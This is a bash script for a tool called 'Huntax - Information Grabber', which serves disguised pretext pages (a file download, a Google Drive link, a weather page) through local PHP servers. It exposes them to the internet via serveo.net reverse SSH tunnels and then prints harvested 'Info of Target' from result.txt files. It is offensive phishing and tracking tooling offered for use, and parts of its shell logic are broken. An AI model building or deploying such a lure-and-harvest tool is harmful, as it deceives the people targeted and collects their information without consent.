#!/bin/bash

Red='\033[0;31m'          # Red
Green='\033[0;32m'        # Green
Yellow='\033[0;33m'       # Yellow
White='\033[0;37m'        # White

echo -e "  ${Yellow}_    _             _             "
echo " | |  | |           | |            "
echo " | |__| |_   _ _ __ | |_ __ ___  __"
echo -e "${White} |  __  | | | | '_ \| __/ _- \ \/ /"
echo " | |  | | |_| | | | | || (_| |>  < "
echo -e " ${Green}|_|  |_|\__,_|_| |_|\__\__,_/_/\_|"

sleep 3s
echo "."
echo "."
echo "."
echo "."
echo -e "[+] ${Yellow}Huntax - Information Grabber Tool"
echo -e "[+] ${Red}Use it carefully, at your own risk"
sleep 2s
echo "."
echo "."
echo "."
echo "."

echo -e "${White}Choose the Template:"
echo
echo -e "${Green}[+] 1. File Download"
echo "[+] 2. Google Drive"
echo "[+] 3. Weather Page"
echo "."
echo "."
echo "."
echo "."

read -p ">> Enter Template Number: " tempno

echo "."
echo "."
echo "."
echo "."

filedownload(){

    echo "Starting PHP Server..."
    cd Tracker/filedownload
    php -S 127.0.0.1:8000
    
}

gdrive(){

    read -p ">> Enter Google Drive File URL: " gdriveurl  #receiving replaceable drive url
    cd Tracker/gdrive/js
    sed 's+REDIRECT_URL+'$gdriveurl'+g' temploc.js
    echo "Success, Google Drive url injected.."
    echo "."
    echo "."
    echo "Starting PHP Server..."
    cd ../../..
    cd Tracker/gdrive
    php -S 127.0.0.1:8000
    
}

weather(){

    echo "Starting PHP Server..."
    cd Tracker/weather
    php -S 127.0.0.1:8000
    echo "Starting serveo"
    ssh -R weatherfindersitex:80:127.0.0.1:8000 serveo.net
    echo "[+] Direct link: weatherfindersitex.serveo.net"
}

resultopen(){
    echo "Sucessfully received Info of Target.."
    echo "Fetching information of Target..."
    if [ $tempno == 1 ]
    then
        file = "Tracker/filedownload/php/result.txt"
        cat $file
    elif [ $tempno == 2 ]
    then 
        file = "Tracker/gdrive/php/result.txt"
        cat $file
    elif [ $tempno == 3]
    then
        file = "Tracker/weather/php/result.txt"
        cat $file
    else
        echo "File not Found, open manually to check results"
    fi
}

if [ $tempno == 1 ]
then
    echo "Executing File Downloader Template"
    filedownload
    sleep 2m        #sleeping for 2 minutes
    resultopen      # Open results page after 2 mins

elif [ $tempno == 2 ]
then 
    echo "Executing Google Drive Template"
    gdrive
    sleep 2m
    resultopen

elif [ $tempno == 3 ]
then
    echo "Executing Weather Template"
    weather
    sleep 2m
    resultopen
else
    echo -e "${Red}Please choose a proper Template!"
fi


serveostart(){
    if [ $tempno == 1 ]
    then
        echo "Starting serveo"
        ssh -R filedownloadersitex:80:127.0.0.1:8000 serveo.net
        echo "[+] Direct link: filedownloadersitex.serveo.net"
    elif [ $tempno == 2 ]
    then 
        echo "Starting serveo"
        ssh -R googledrivedownloaderx:80:127.0.0.1:8000 serveo.net
        echo "[+] Direct link: googledrivedownloaderx.serveo.net"
    elif [ $tempno == 3]
    then
        echo "Starting serveo"
        ssh -R weatherfindersitex:80:127.0.0.1:8000 serveo.net
        echo "[+] Direct link: weatherfindersitex.serveo.net"
    else
        echo "File not Found, open manually to check results"
    fi
}